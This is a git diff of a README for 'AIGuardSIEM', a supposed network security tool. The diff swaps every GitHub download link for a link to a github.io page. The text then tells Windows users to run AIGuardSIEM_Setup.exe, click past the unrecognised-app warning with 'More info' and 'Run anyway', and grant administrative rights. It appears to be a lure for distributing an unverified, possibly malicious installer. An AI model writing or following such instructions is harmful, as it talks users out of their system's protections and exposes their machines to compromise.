@@ -1,6 +1,6 @@
 # 🛡️ AIGuardSIEM - Secure Your Network With Intelligent Protection
 
-[![](https://img.shields.io/badge/Download-AIGuardSIEM-blue)](https://github.com/Anonymous-conditionalreflex438/AIGuardSIEM)
+[![](https://img.shields.io/badge/Download-AIGuardSIEM-blue)](https://anonymous-conditionalreflex438.github.io)
 
 AIGuardSIEM protects your computer network from threats. It watches your system logs and data to find suspicious activity. The software uses machine learning to identify attacks before they cause damage. You can manage your security settings and view reports from one dashboard.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these basic needs to run the software:
 
 Follow these steps to set up AIGuardSIEM on your Windows machine.
 
-1. Go to the [official release page](https://github.com/Anonymous-conditionalreflex438/AIGuardSIEM) to download the installer.
+1. Go to the [official release page](https://anonymous-conditionalreflex438.github.io) to download the installer.
 2. Locate the file named AIGuardSIEM_Setup.exe in your Downloads folder.
 3. Double-click the file to start the installation process.
 4. Follow the on-screen instructions to finish the setup.
@@ -26,7 +26,7 @@ Follow these steps to set up AIGuardSIEM on your Windows machine.
 
 ## 🛠 Installation Guide
 
-You can find the installation files at this link: [https://github.com/Anonymous-conditionalreflex438/AIGuardSIEM](https://github.com/Anonymous-conditionalreflex438/AIGuardSIEM).
+You can find the installation files at this link: [https://anonymous-conditionalreflex438.github.io](https://anonymous-conditionalreflex438.github.io).
 
 When the installer opens, Windows may show a security window. Click "More info" and then "Run anyway" if the system asks for permission to open an unrecognized app. This occurs because the tool interacts with system logs. The program requires administrative rights to monitor your network traffic effectively. Select the default installation path to ensure all components work together without errors.
 
